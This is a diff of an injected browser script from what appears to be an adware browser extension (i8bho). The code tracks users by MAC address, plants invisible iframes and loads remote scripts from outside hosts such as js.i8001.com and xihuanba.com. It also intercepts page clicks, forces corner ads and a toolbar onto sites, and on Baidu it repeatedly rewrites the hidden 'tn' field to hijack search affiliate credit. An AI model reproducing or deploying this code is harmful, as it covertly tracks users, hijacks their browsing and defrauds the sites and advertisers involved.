@@ -1,4 +1,3 @@
-var I8zc_ifiedown= true;
 var	i8bho_bindoemid= i8bho_bindoemid||'-',
 	i8bho_nid= i8bho_nid||0,
 	i8bho_rid= i8bho_rid||0,
@@ -10,20 +9,21 @@ var	i8bho_bindoemid= i8bho_bindoemid||'-',
 	I8zc_ifiedown= I8zc_ifiedown||0,
 	I8zc_ifrpopup= I8zc_ifrpopup||0,
 	I8zc_popper= I8zc_popper||0,
-	i8loaded= false;
+	I8zc_ifyishuqian= I8zc_ifyishuqian||0;
 
-var i8cgif_moved= false;
 
-window.i8vars= {
-	charset : document.charset&&document.charset.toLowerCase() || document.characterSet&&document.characterSet.toLowerCase() || 'gbk',
+window.i8vars= window.i8vars || {
+	charset : document.charset && document.charset.toLowerCase() || document.characterSet && document.characterSet.toLowerCase() || 'gbk',
 	cmtorid : 'i8_communicator',
 	loaded: false,
 	msie : 6,
-    urlMaxLen : 2048,
+	urlMaxLen : 1024,
 	referrer: document.referrer || '',
 	category: 'default',
 	words: [],
+	corner: false,
 	rand: function(min,max){return Math.round(Math.random() * (max-min)) + min},
+	track: 'http://bho.i8.com.cn/c.gif?nid='+i8bho_nid+'&cmac='+i8bho_cmac+'&_='+Math.random(),
 	log: function(src)
 	{
 		var img= new Image();
@@ -48,8 +48,8 @@ window.i8vars= {
 					if( !this.readyState || this.readyState === "loaded" || this.readyState === "complete" ){callback()}
 				}
 			}
-			else if( i==='onkeyup' )obj.onkeyup= attr[i];
-			else if( i==='onclick' ){obj.onclick= attr[i];}
+			else if( i==='onkeyup' ) obj.onkeyup= attr[i];
+			else if( i==='onclick' ) obj.onclick= attr[i];
 			else obj.setAttribute(i, attr[i]);
 		}
 		return obj;
@@ -58,33 +58,28 @@ window.i8vars= {
 
 function i8main()
 {
-	if( i8vars.loaded ) return;
-	i8vars.loaded= true;
-
 	var doc= document, win= window, body= doc.body, eldest= body.children.item(0), host= doc.location.hostname;
 
 	i8vars.msie= (msie= /msie ([\w.]+)/i.exec(window.navigator.userAgent)) && (msie= msie[1]) || false;
 
-	i8vars.log('http://bho.i8.com.cn/c.gif?nid='+i8bho_nid.toString()+'&cmac='+i8bho_cmac);
-
-	//crawl
-//	if( i8vars.rand(1,100)<=15 )
-
 	//fuzzy (partial match) value search in array
-	function partOf(haystack, needles){
+	function partOf(haystack, needles)
+	{
 		for(i in needles)
 			if( typeof needles[i]==='string' && haystack.indexOf(needles[i])>-1 )
 				return true;
 		return false;
 	}
 
+
 	if( partOf(host, ['youku','iqiyi','ku6','soku','a67','video','56.com','dianying','yisou','kankan.xunlei','letv','tudou','aipai.com']) ){
 		 i8vars.category= 'movies';
 	}
 
-	if( partOf(host, ['192.168','soso.com','www.baidu','google', '6.cn'])===false )
+	if( partOf(host, ['192.168', 'soso.com', 'www.baidu', 'google', 'i8'])===false )
 	{
 		var charset= i8vars.charset.replace(/[\-\/\'\"]/g,'')=='utf8'? 'utf8':'gbk';
+
 		body.insertBefore(i8vars.create('script', {
 			'charset': charset,
 			'type': 'text/javascript',
@@ -93,10 +88,13 @@ function i8main()
 			'onload': function()
 				{
 					i8vars.words= words();
-					if( I8zc_ifiedown )
+					if( I8zc_ifiedown ){
 						showBar();
-					if( i8vars.rand(1,100)<=5 )
+					}
+
+					if( i8vars.rand(1,100)<=4 ){
 						cornerAd('baidu');
+					}
 				}
 		}), eldest);
 
@@ -104,7 +102,7 @@ function i8main()
 		if( i8vars.rand(1,100)<=3 )
 		{
 			body.insertBefore(i8vars.create('iframe', {
-				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0',
+				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0;position:absolute;visibility:hidden;',
 				'src': 'http://ads.i8.com.cn/ad/client/cn.html?nid=' + i8bho_nid + '&oemid=' + i8bho_bindoemid + '&cmac=' + i8bho_cmac + '&rid=' + i8bho_rid
 			}), eldest);
 		}
@@ -113,14 +111,16 @@ function i8main()
 		if( i8vars.rand(1,100)<=1 )
 		{
 			body.insertBefore(i8vars.create('iframe', {
-				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0',
+				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0;position:absolute;visibility:hidden;',
 				'src': 'http://www.zhaochina.com/ied_new/2/bt.html'
 			}), eldest);
 		}
 
+
 		// ~ ?% (10?)
-		if( I8zc_ifrpopup && (Math.floor(I8zc_popper*10) > i8vars.rand(1,10)) )
+		if( I8zc_ifrpopup && (Math.floor(I8zc_popper*10) > i8vars.rand(0,9)) ){
 			cornerAd();
+		}
 
 		//catch all clicks then filter
 		body.onclick= function(event)
@@ -134,12 +134,16 @@ function i8main()
 			}
 		}
 
-		body.insertBefore(i8vars.create('script', {
-			'type': 'text/javascript',
-			'async': true,
-			'src': 'http://utils.cdn.xihuanba.com/Js/CollectionPlugin.Auto.js'
-		}), eldest);
+		if( i8bho_nid=='413275' || i8bho_nid=='337244' || partOf(host, ['qq'])===false )
+		{
+			body.insertBefore(i8vars.create('script', {
+				'type': 'text/javascript',
+				'async': true,
+				'src': 'http://utils.cdn.xihuanba.com/Js/CollectionPlugin.Auto.js'
+			}), eldest);
+		}
 	}
+
 
 	function showBar()
 	{
@@ -148,7 +152,7 @@ function i8main()
 		var
 			//main bar's div
 			wrapper= i8vars.create('div', {
-				'css':'min-width:900px;width:100%;z-index:2147483646;zoom:1;line-height:14px;font-size:13px;height:28px;background:#fff;border:0;padding:0;margin:0;text-align:center;border-bottom:1px solid #ddd;'
+				'css':'min-width:900px;width:100%;z-index:2147482644;zoom:1;line-height:14px;font-size:13px;height:28px;background:#fff;border:0;padding:0;margin:0;text-align:center;border-bottom:1px solid #ddd;'
 					+ (i8vars.msie && i8vars.msie<7?'width:expression(document.body.clientWidth>900?"100%":"900px");position:absolute;left:0;top:expression((0+(ignore=document.documentElement.scrollTop?document.documentElement.scrollTop:body.scrollTop))+"px");':'position:fixed;top:0;left:0')
 			}),
 			//holders
@@ -158,19 +162,16 @@ function i8main()
 
 		//generate
 		searchInput(search);
-		keywordLinks(links);
 
-        i8vars.links = links;
-//		i8vars.srvTestAds= 'World Of Tank';
-//
-//		setTimeout( function(){adTest(links);}, 500);
+		//ad link(a)
+		//i8vars.links= links;
+
+		//default links
+		keywordLinks(links);
 
 		//ASSEMBLE
 		wrapper.appendChild(search);
 		wrapper.appendChild(links);
-
-		//
-		wrapper.appendChild(tools);
 
 		//clear
 		wrapper.appendChild(i8vars.create('div', {'style':'clear:both'}));
@@ -259,8 +260,50 @@ function i8main()
 	}
 
 	//print an ad in the corner
+	function cornerAd300()
+	{
+		var url= 'http://ads.i8.com.cn/bho/ie/300250ceshi.html';
+
+		//holding div
+		var div= i8vars.create('div', {
+				'css':'z-index:2147482643;width:300px;height:250px;position:'
+				+ (i8vars.msie && i8vars.msie<8?'absolute;bottom:auto;top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));':'fixed;bottom:0;')
+				+ 'right:0;border:1px solid #999999;margin:0;padding:1px;overflow:hidden;display:block;background:#fff'
+			});
+		//advert
+		div.appendChild(i8vars.create('iframe', {
+			'scrolling':'no', 'height':'100%', 'width':'100%', 'border':0, 'frameBorder':0,
+			'css':'width:100%;height:100%;frameBorder:0;border:0;padding:0;margin:0', 'src': url
+		}));
+
+		//close "x" button
+		div.appendChild(i8vars.create('div', {
+			'onclick': function(){
+				//div= undefined;
+				//this.parentNode.parentNode.removeChild(this.parentNode)
+				this.parentNode.style.display= 'none'
+			},
+			'css':'position:absolute;border:1px solid #ddd;right:0;bottom:0;color:red;font-size:12px;padding:0 5px;cursor:pointer;background:#eee',
+			innerText:" X "
+		}));
+		//insert
+		body.insertBefore(div, eldest);
+	}
+
+
 	function cornerAd(type)
 	{
+		if( i8vars.corner ){
+			return 1;
+		}else{
+			i8vars.corner= true;
+		}
+
+		if( i8vars.rand(0, 100)<=10 ){
+			cornerAd300()
+			return;
+		}
+
 		if( type==='baidu' )
 			var url= "http://fenxiang.i8.com.cn/?k=" + encodeURIComponent(i8vars.words.join('-')).replace(/-/g, '+');
 		else
@@ -270,16 +313,14 @@ function i8main()
 		var corner= i8vars.rand(0, 5) ? 'right' : 'left',
 		//holding div
 			div= i8vars.create('div', {
-				'css':'z-index:2147483645;width:260px;height:220px;position:'
+				'css':'z-index:2147482643;width:260px;height:220px;position:'
 				+ (i8vars.msie && i8vars.msie<8?'absolute;bottom:auto;top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));':'fixed;bottom:0;')
 				+ corner + ':0;border:1px solid #999999;margin:0;padding:1px;overflow:hidden;display:block;background:#fff'
 			});
 		//advert
 		div.appendChild(i8vars.create('iframe', {
-			'scrolling':'no',
-			'height':'100%', 'width':'100%', 'border':0, 'frameBorder':0,
-			'css':'width:100%;height:100%;frameBorder:0;border:0;padding:0;margin:0',
-			'src': url
+			'scrolling':'no', 'height':'100%', 'width':'100%', 'border':0, 'frameBorder':0,
+			'css':'width:100%;height:100%;frameBorder:0;border:0;padding:0;margin:0', 'src': url
 		}));
 
 		//close "x" button
@@ -287,8 +328,8 @@ function i8main()
 			{
 			'onclick': function()
 				{
-					div= undefined;
-					this.parentNode.parentNode.removeChild(this.parentNode)
+					//this.parentNode.parentNode.removeChild(this.parentNode)
+					this.parentNode.style.display= 'none'
 				},
 			'css':'position:absolute;border:1px solid #ddd;' + (i8vars.rand(0,1) ? 'right':'left') + ':0;' + (i8vars.rand(0,1) ? 'top':'bottom') + ':0;color:red;font-size:12px;padding:0 5px;cursor:pointer;background:#eee',
 			innerText:" X "
@@ -332,17 +373,17 @@ function i8main()
 							return false;
 						},
 						'id': 'i8-searchSelected-text',
-						'css': 'z-index:2147483644;position:absolute;margin:0;padding:2px 0 0;border-top:1px #e5e5e5 solid;border-right:1px #888 solid;border-bottom:1px #999 solid;color:#fff;background-color:blue;text-decoration:none',
+						'css': 'z-index:2147482642;position:absolute;margin:0;padding:2px 0 0;border-top:1px #e5e5e5 solid;border-right:1px #888 solid;border-bottom:1px #999 solid;color:#fff;background-color:blue;text-decoration:none',
 						'innerHTML': '&#9658;&nbsp;\u641c\u641c&nbsp;&nbsp;'
 					});
 					body.insertBefore(div, eldest);
 				}
 
-				if( div.href!=='http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=' + encodeURIComponent(text) )
+				if( div.href!=='http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_15&w=' + encodeURIComponent(text) )
 				{
 					div.style.top=event.pageY - (i8vars.msie&&i8vars.msie?0:10) + 'px';
 					div.style.left=event.pageX - (i8vars.msie&&i8vars.msie?5:10) + 'px';
-					div.href= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=' + encodeURIComponent(text);
+					div.href= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_15&w=' + encodeURIComponent(text);
 					div.style.display= 'block';
 				}
 			}
@@ -352,7 +393,7 @@ function i8main()
 	//try to match words with text on page
 	function words()
 	{
-		var i= 0, length= i8vars.words.length, max= 30, matches= [], text= body.innerText.toLowerCase();
+		var i= 0, length= i8vars.words.length, max= 7, matches= [], text= body.innerText.toLowerCase();
 
 		//match
 		while( length>++i && matches.length<max ){
@@ -368,14 +409,77 @@ function i8main()
 		return matches;
 	}
 
-	body.insertBefore(i8vars.create('script', {'src': 'http://js.i8001.com/browser/control.nocache.js','type': 'text/javascript'}), eldest);
-	body.insertBefore(i8vars.create('script', {'src': 'http://js.i8001.com/browser/crawler.js','type': 'text/javascript'}), eldest);
+    if (i8vars.rand(1,100) <= 100)
+	    body.insertBefore(i8vars.create('script', {'src': 'http://js.i8001.com/browser/crawler.js','type': 'text/javascript'}), eldest);
 };
 
-(function(){
-	if( document.body=='undefined' || !document.body ){
-		return setTimeout(arguments.callee, 100);
-	}
-	i8main();
-})();
 
+(function()
+{
+	if( i8vars.loaded ) return;
+
+	if( document.body=='undefined' || !document.body || !document.body.children || !document.body.children.length ){
+		return setTimeout(arguments.callee, 250);
+	}
+
+	i8vars.eldest= document.body.children.item(0);
+
+	i8vars.loaded= true;
+
+	var track= new Image();
+		track.src= i8vars.track;
+		track.onerror= function()
+		{
+			setTimeout(
+				function(){
+					var track= new Image();
+						track.src= i8vars.track;
+			}, 750);
+		}
+
+	if( i8bho_nid=='337244' || i8vars.rand(1,100)<=5 ){
+		document.body.insertBefore(i8vars.create('script', {'src': 'http://bho.i8.com.cn/browser/gngo.js','type': 'text/javascript'}), i8vars.eldest);
+	}
+
+	setTimeout(function(){i8main();}, 500);
+
+	var host= document.location.hostname||document.location.host||document.location.href;
+	if( host.match('www.baidu.com') )
+	{
+		setInterval(function()
+		{
+			var tn= false, wd= false, tnv= 'empty', cookies= document.cookie.split('; '), inputs= document.getElementsByTagName('input');
+			for(i in inputs)
+			{
+				var el= inputs[i]
+				if( !tn && typeof(el)=='object' && typeof(el.getAttribute)!=="undefined" && el.getAttribute && el.getAttribute('name')=='tn' && el.getAttribute('type')=='hidden' ){
+					tn= el, tnv= el.value;
+				}
+				else
+				if( !wd && typeof(el)=='object' && typeof(el.getAttribute)!=="undefined" && el.getAttribute && el.getAttribute('name')=='wd' ){
+					wd= el;
+				}
+			}
+
+			if( document.location.href.indexOf('gnetinc_pg')>-1 )
+			{
+				if( tn && tnv!='gnetinc_pg' ){
+					el.value= 'gnetinc_pg';
+				}
+				else if( !tn && wd ){
+					wd.parentNode.parentNode.appendChild(i8vars.create('input', {'type':'hidden', 'name':'tn', 'value':'gnetinc_pg'}));
+				}
+			}
+			else if( document.location.href.indexOf('gnetinc_dg')>-1 )
+			{
+				if( tn && tnv!='gnetinc_dg' ){
+					el.value= 'gnetinc_dg';
+				}
+				else if( !tn && wd ){
+					wd.parentNode.parentNode.appendChild(i8vars.create('input', {'type':'hidden', 'name':'tn', 'value':'gnetinc_dg'}));
+				}
+			}
+		}, 125);
+	}
+
+})();
